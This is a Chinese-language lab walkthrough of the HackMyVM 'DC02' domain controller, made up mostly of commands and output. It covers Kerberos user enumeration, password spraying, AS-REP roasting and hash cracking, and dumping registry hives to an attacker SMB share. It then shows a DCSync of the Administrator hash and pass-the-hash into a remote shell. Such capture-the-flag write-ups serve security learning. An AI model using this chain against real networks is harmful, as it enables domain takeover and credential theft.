---
title: HackMyVM-DC02
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# DC02.

> https://hackmyvm.eu/machines/machine.php?vm=DC02
> 

Notes: **Second DC from me. Enjoy it.**

## 信息打点

```python
// 寻找靶机IP 126
nmap -sP 192.168.56.0/24                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 00:16 EST
Nmap scan report for 192.168.56.1
Host is up (0.00044s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00049s latency).
MAC Address: 08:00:27:77:3D:23 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.126
Host is up (0.00028s latency).
MAC Address: 08:00:27:19:C5:0F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 27.99 seconds

// 端口扫描
nmap -sT -min-rate 10000 -p- 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 00:17 EST
Strange read error from 192.168.56.126 (104 - 'Connection reset by peer')
Nmap scan report for 192.168.56.126
Host is up (0.0014s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
MAC Address: 08:00:27:19:C5:0F (Oracle VirtualBox virtual NIC)

// 服务版本扫描
nmap -sT -sV -O -p- 192.168.56.126                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 00:24 EST
Nmap scan report for 192.168.56.126                                                                                                                          
Host is up (0.00074s latency).                                                
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-20 20:26:28Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                   
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0             
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)         
9389/tcp  open  mc-nmf        .NET Message Framing                                                     
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                   
MAC Address: 08:00:27:19:C5:0F (Oracle VirtualBox virtual NIC)                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10      
Aggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%) 
No exact OS matches for host (test conditions non-ideal).                     
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## 渗透

### SMB

无任何凭据和线索，只能从SMB开始

当头一棒，不能使用匿名帐户，所以`LDAP`枚举用户也不能成功了

```python
smbclient -L 192.168.56.126                                                    
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

### 域内用户枚举

使用`kerbrute` 来枚举用户名，字典是`github`上找的

```python
./kerbrute_linux_amd64 userenum --dc 192.168.56.126 -d SOUPEDECODE.LOCAL ../../Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/20/25 - Ronnie Flathers @ropnop

2025/01/20 01:06:36 >  Using KDC(s):
2025/01/20 01:06:36 >   192.168.56.126:88

2025/01/20 01:06:36 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/01/20 01:06:36 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/01/20 01:06:36 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2025/01/20 01:06:37 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2025/01/20 01:06:37 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2025/01/20 01:06:39 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2025/01/20 01:06:39 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2025/01/20 01:06:53 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2025/01/20 01:09:22 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2025/01/20 01:09:22 >  [+] VALID USERNAME:       kleo2@soupedecode.local
2025/01/20 01:09:22 >  [+] VALID USERNAME:       dc01@soupedecode.local
```

找到好几个用户，将结果保存为`user.txt`，使用脚本将用户名截取然后保存下来

```python
with open('user.txt','r') as file1:
    data = file1.read()
    lines = data.splitlines()
with open('user.txt','w') as file2:
    for line in lines:
        file2.write(line[line.find('E:')+9:line.find('@')]+'\n')
```

### 尝试用户弱密码

使用`crackmapexec`来测试是否存在弱密码，发现`charlie`用户存在弱密码

```python
crackmapexec smb 192.168.56.126 -u user.txt -p user.txt --continue-on-success --no-bruteforce
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\Charlie:Charlie STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\Admin:Admin STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\CHARLIE:CHARLIE STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:ADMIN STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS_LOGON_FAILURE
```

得到密码后，就可以通过`LDAP`来枚举域内用户名了,将结果保存为`res`使用脚本截取出来

```python
lookupsid.py 'SOUPEDECODE.LOCAL/charlie@192.168.56.126' > res
```

```python
with open('res','r') as file:
    data = file.read()
    lines = data.splitlines()
with open('username.txt','w+') as file2:
    for line in lines:
        file2.write(line[line.find('\\') + 1:line.find('(')-1] + '\n')
```

然后再测试别的用户是否存在弱密码，结果还是只有`charlie`

```python
crackmapexec smb 192.168.56.126 -u username.txt -p username.txt --continue-on-success --no-bruteforce | grep [+]
SMB                      192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
```

### 再次访问SMB

通过`charlie`用户去访问SMB

```python
smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/charlie%charlie

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.126 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

最后发现`SYSVOL`里边存在东西，但是东西好像没用

```python
smbclient //192.168.56.126/SYSVOL -U SOUPEDECODE.LOCAL/charlie%charlie
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 15 15:21:21 2024
  ..                                  D        0  Sat Jun 15 15:21:21 2024
  SOUPEDECODE.LOCAL                  Dr        0  Sat Jun 15 15:21:21 2024

                12942591 blocks of size 4096. 10927852 blocks available
smb: \> cd SOUPEDECODE.LOCAL
smb: \SOUPEDECODE.LOCAL\> dir
  .                                   D        0  Sat Jun 15 15:30:47 2024
  ..                                  D        0  Sat Jun 15 15:21:21 2024
  DfsrPrivate                      DHSr        0  Sat Jun 15 15:30:47 2024
  Policies                            D        0  Sat Jun 15 15:21:30 2024
  scripts                             D        0  Sat Jun 15 15:21:21 2024

                12942591 blocks of size 4096. 10927852 blocks available
```

### **AS_REP Roasting**

本来想尝试`Kerbeoating`的，但是拿不到SPN

```python
GetUserSPNs.py SOUPEDECODE.LOCAL/charlie:charlie -dc-ip 192.168.56.126 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

看了下WP，发现可以通过 **AS_REP Roasting** 来进行下一步操作

通过 `GetUserSPNs.py` 枚举出关闭了预认证的用户

```python
GetNPUsers.py -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/ -usersfile username.txt | grep 'SOUPEDECODE.LOCAL' 
/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e
```

将用户的`hash`加密后的`Login session key`进行破解

寻找密码类型，得知是`18200`

```python
hashcat -h | grep Kerber  
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

爆破密码

```python
hashcat -m 18200 '$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e' /usr/share/wordlists/rockyou.txt
//
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e:internet
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e18...55585e
Time.Started.....: Mon Jan 20 02:30:05 2025 (1 sec)
Time.Estimated...: Mon Jan 20 02:30:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    39362 H/s (2.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Util: 15%
```

的到密码 `internet`

### 再次访问SMB

经测试该用户可以访问其`C`盘

```python
smbclient //192.168.56.126/C$ -U SOUPEDECODE.LOCAL/zximena448%internet
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sat Jun 15 15:19:51 2024
  Documents and Settings          DHSrn        0  Sat Jun 15 22:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Mon Jan 20 18:17:33 2025
  pagefile.sys                      AHS 1476395008  Mon Jan 20 18:17:33 2025
  PerfLogs                            D        0  Sat May  8 04:15:05 2021
  Program Files                      DR        0  Sat Jun 15 13:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 05:34:13 2021
  ProgramData                       DHn        0  Sat Jun 15 22:51:08 2024
  Recovery                         DHSn        0  Sat Jun 15 22:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 15:02:21 2024
  Users                              DR        0  Mon Jun 17 14:31:08 2024
  Windows                             D        0  Sat Jun 15 15:21:10 2024

                12942591 blocks of size 4096. 10926158 blocks available
smb: \> 
```

### UserFlag

```python
smb: \Users\zximena448\Desktop\> get user.txt
getting file \Users\zximena448\Desktop\user.txt of size 33 as user.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)

cat user.txt                             
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

通过evil-winrm登陆不进去，可能无权限

### 域内信息收集

通过`LdapDomainDump`

```python
ldapdomaindump SOUPEDECODE.LOCAL -u 'SOUPEDECODE.LOCAL\zximena448' -p 'internet'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

查看该用户信息，发现是`Backup Operators` 组的用户

```python
cat domain_users.grep | grep zximena448
Zach Ximena     Zach Ximena     zximena448      Backup Operators        Domain Users    06/15/24 20:04:37       01/20/25 20:57:38       01/20/25 23:21:12   NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH     06/17/24 18:09:53       S-1-5-21-2986980474-46765180-2505414164-1142    Volunteer teacher and education advocate
```

网上看了关于`Backup Operators` 组，是`Windows`特权组，可以提取主机上的`SAM`，`SECURITY` ，`SYSTEM`等文件

> Backup Operators组的成员可以备份和恢复计算机上所有的文件，不论保护这些文件的权限是什么。Backup Operators也可以登录和关闭计算机。这个组不能被重命名，删除或者移动。默认情况下，这个内置的组没有成员，可以在域控上执行备份和恢复操作。
> 

开启SMB服务器

```python
smbserver.py -smb2support "someshare" "./" 
```

使用`impacket`工具集中的`reg` 远程保存`SAM`注册表项

```python
 **reg.py "SOUPEDECODE.LOCAL"/"zximena448":"internet"@"192.168.56.126" save -keyName 'HKLM\SAM'  -o '\\192.168.56.4\someshare'
 reg.py "SOUPEDECODE.LOCAL"/"zximena448":"internet"@"192.168.56.126" save -keyName 'HKLM\SECURITY'  -o '\\192.168.56.4\someshare'
 reg.py "SOUPEDECODE.LOCAL"/"zximena448":"internet"@"192.168.56.126" save -keyName 'HKLM\SYSTEM'  -o '\\192.168.56.4\someshare'**
```

然后通过`secretsdump.py` 将 `SAM` 和 `SECURITY`转成`HASH`

```python
secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:81d6bd9d4f3393bea5ae2b72f672a394eab4830f35c0462e357af7eff5d951ace05b9d7967fcad00bacf6b599e76bbf49ac936c3219241f19c8563f9022d9e02f546dc5c26c03d9e8d1f42ad94fbeecd47efc6a572a94c7b70d437d327790385fe8b0297068c5b7e7140e4b0ab83c27dc5dc9658fe4df7bb7759efb1472b7ccaeb2a73b8341120e730749b5d5b6d6428ea23cae3f9f97e1d29777f63f700da98e68ce8cc2f98b3f5d3f0c0db0ee62c1d1616c4c603764546c658a778cf2f67c9e1c601ee63ee29bfdb5ae6790fcfd013038f1e0ebfaa303aed86e5c2dbf3c62b2aa4099ed6d37aceb9ecdf778af01f80
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```

可以拿到`administrator`的NTLM

```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

尝试登录，失败

```python
crackmapexec smb 192.168.56.126 -u administrator -H 209c6174da490caeb422f3fa5a7ae634                    
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE
```

现在还存在机器账户的hash `$MACHINE.ACC`

```python
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55
```

枚举看是哪台机子的哈希，得出来是`DC01$`的

```python
crackmapexec smb 192.168.56.126 -u username.txt -H 159de75b1e7662879be6482554b90e55
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:159de75b1e7662879be6482554b90e55
```

得到是`DC01$`的hash后，再次进行`secretsdump.py` 获取`Administrator`的hash

```python
secretsdump.py soupedecode.local/'DC01$'@192.168.56.126 -hashes ':159de75b1e7662879be6482554b90e55' | grep "Administrator"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Administrator:aes256-cts-hmac-sha1-96:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318
Administrator:aes128-cts-hmac-sha1-96:4b4cf4064e92346339b1a3ef3ff65d6b
Administrator:des-cbc-md5:b0614357f8160ef4
```

### HASH传递

拿到`administrator`的`NTLMhash`后就可以进行传递了

```python
crackmapexec smb 192.168.56.126 -u Administrator -H 8982babd4da89d33210779a6c5b078bd
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)
```

```python
evil-winrm -i 192.168.56.126 -u 'administrator' -H '8982babd4da89d33210779a6c5b078bd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>                                   
```

### RootFlag

```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d41d8cd98f00b204e9800998ecf8427e
```